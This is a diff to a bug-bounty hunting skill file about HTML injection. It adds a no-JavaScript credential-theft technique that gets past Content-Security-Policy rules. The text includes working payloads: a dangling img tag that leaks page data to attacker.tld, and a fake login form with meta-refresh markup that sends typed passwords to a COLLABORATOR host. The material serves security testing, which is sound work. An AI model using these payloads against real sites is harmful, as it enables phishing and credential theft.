@@ -2,7 +2,7 @@
 name: hunt-html-injection
 description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
 sources: hackerone_public, public_research
-report_count: 6
+report_count: 7
 ---
 
 ## What is HTML Injection
@@ -19,6 +19,24 @@ HTML Injection occurs when user input is inserted into a page's HTML without esc
 - Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
 - **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
 - **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.
+
+## CSP-Constrained Injection — No-JS Credential Exfiltration via Self-Posting Form
+
+When the injection point sits behind a Content-Security-Policy that blocks script execution (`default-src 'none'`, no usable gadget host), HTML injection can still exfiltrate credentials with **zero JavaScript**, because `form-action` is a separate directive that `default-src`/`script-src` do not cover. If `form-action` is absent or set to `'self'`, an injected `<form>` can submit to the page's own origin:
+
+1. **Stage one** — inject a form with no `action` attribute (so it submits back to the current page) containing fake `username`/`password` inputs plus a `<textarea>` named after a parameter the page reflects unescaped:
+   ```html
+   <form>
+     <input name=username>
+     <input type=password name=password>
+     <textarea name=q><meta name=referrer content=unsafe-url><meta http-equiv=refresh content="5;url=https://COLLABORATOR"></textarea>
+     <input type=submit>
+   </form>
+   ```
+2. When the victim fills this fake login form and submits, the browser puts everything — including the textarea contents — into the GET query string: `/?username=...&password=...&q=<stage-two-markup>`.
+3. The page reflects `q` unescaped, so stage two now renders as live HTML: it sets `referrer-policy: unsafe-url` and then navigates via `<meta http-equiv=refresh>` to an attacker-controlled host. No script runs — a navigation is not blocked by CSP — and the `Referer` header on that navigation carries the full URL, including the victim's typed credentials.
+
+This only needs a reflected-HTML sink plus a `form-action` directive that is missing or `'self'`; `strict-dynamic`/nonces/hashes on `script-src` are irrelevant since no script executes. Check every enforced `Content-Security-Policy` header for `form-action` before concluding injected markup is "just" HTML injection with no real impact — this is still a critical credential-theft chain. Cross-reference: `hunt-xss` CSP-bypass section covers the script-gadget route (allow-listed JSONP/AngularJS hosts) when `script-src` itself is permissive. Source: <https://portswigger.net/research/blind-trust-stealing-credentials-through-csp>.
 
 ## Attack Surface
 
